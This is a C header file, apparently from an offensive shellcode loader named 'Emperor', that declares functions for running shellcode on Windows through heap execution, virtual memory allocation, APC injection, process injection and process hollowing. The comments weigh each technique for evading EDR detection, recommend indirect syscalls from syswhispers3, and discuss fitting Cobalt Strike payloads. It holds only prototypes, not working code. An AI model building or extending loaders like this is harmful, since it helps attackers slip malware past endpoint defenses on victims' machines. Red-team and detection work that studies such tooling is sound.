// runner.h - runner function prototypes are defined here.
// ___________
// \_   _____/ _____ ______   ___________  ___________ 
//  |    __)_ /     \\____ \_/ __ \_  __ \/  _ \_  __ \
//  |        \  Y Y  \  |_> >  ___/|  | \(  <_> )  | \/
// /_______  /__|_|  /   __/ \___  >__|   \____/|__|   
//         \/      \/|__|        \/                    

//                        ..::--:....                        
//                     .-#%%%%%%%%#*=:.......::-..           
//                  ..=#%%%%%@@@%%%%%%###***#***+=.          
//                 .-===##%%%%%%%#*+=--=+*--......           
//                .=+==+%%%%%%%%*-==*#%#:....                
//               .=-=+=#@@@@%%%%@@@%%%=.                     
//             .:==::==%%@%%%%%%%%%%%:.                      
//           .:+**=-::-=#%%%%%%%%%%*:.                       
//        ..-*****+=------=+##%%%#-...                       
//        .+****+++++==----===****=:..                       
//       .*#**+++++*+++++++++==-----=-..                     
//      .+#*+=+***####=-::--::::::::::..                     
//      :#*=+**####+:::::::::::::::::::..                    
//     .+*+***###+-:::::::::::::::...::..                    
//    .-*===*##*-:..::::::::::::....:::..                    
//    :#+=-=+#%*:...:::::::::..:::--:::..                    
//   .*+===++%*:::..::::::::...:::::::::..                   
//  .+*+++##*%-:::....::::::.......:::::..                   
//  :#+++*%#**:::.....:::::::::....::::-:.                   
// .+#*+*#%##-:::.....:::::::::::::::::-+.                   
// :*****#@#=:::.....::::::::::::::::::-#+                   
//.=*+***#%-:::.....:::::::::::::::::::-*%-                  
//.+*****#=-:::::...:::::::------:---:::-+%:                 
#pragma once
#include "defs.h"
#include "Windows.h"

#ifdef RUN_HEAP
// allocates memory on the heap that is executable, writes our shellcode to it
// and then executes it. The pros of this is that heap allocation and writing
// is typically not caught by EDR, downsides is that it doesn't allocate via
// syscalls so this will be resolved by string searches or EDR could hook HeapAlloc
// in the future. However, heap allocation is very common (for example, c "malloc" command)
void run_nomigrate_heap(const char** pBuf, const char** pDict, size_t buf_size);
#endif


#ifdef RUN_VIRTUAL
// allocates virtual memory and then writes to it and executes our shellcode there.
// pros of this is that we use indirect randomized syscalls to do that, and that we can
// makes sure our memory permissions are not RWX. Downside is that this is the defacto
// way to load shellcode, so it's possible it could be behaviorally signatured in the future.
void run_nomigrate_virtual(const char** pBuf, const char** pDict, size_t buf_size);
#endif

#ifdef RUN_APC
// for this we need our buffer and command line pointers and sizes, as well as the pointer to our dictionary for decoding.
// this creates a child process and injects into it via queuing a remote APC. using mapped memory. We map the memory into
// our own process and then copy that mapping into another process. I don't know how to make this work without using RWX,
// since the mapped memory permissions can't be changed with VirtualProtect (at least this implementation). But a good
// migration technique all the same. Probably the recommended over standard injection.
void run_migrate_apc(const char** pBuf, const char** pDict, size_t buf_size, const char** pCmd_line, size_t cmd_line_size);
#endif


#ifdef RUN_INJECT
// performs a basic process injection of a child process. does so using indirect randomized syscalls gathered from syswhispers3
// given that we're using syscalls for this, you will probably be as fine as you can be from an opsec perspective, however, 
// this is the defacto migration technique, so EDR has been better and better at detecting. definetely worth a try in your target
// environment. This also does not use RWX permissions so that is a plus.
void run_migrate_inject(const char** pBuf, const char** pDict, size_t buf_size, const char** pCmd_line, size_t cmd_line_size);
#endif

#ifdef RUN_HOLLOW
// performs shellcode execution via process hollowing. This is the stealthiest method to pivot here, however, there's a catch...
// you can only hollow into processes where there is space for you, the entry point to the end of the allocated memory for that
// process... with something like Cobalt Strike, which is pretty big, this isn't sustainable long term, it can already barely
// fit in anything. You could modify this by allocating more memory, but I feel like that kind of defeats the purpose. Your
// best bet is probably using this with smaller post ex shellcode or a stager.
void run_migrate_hollow(const char** pBuf, const char** pDict, size_t buf_len, const char** pCmd_line, size_t cmd_line_size);
#endif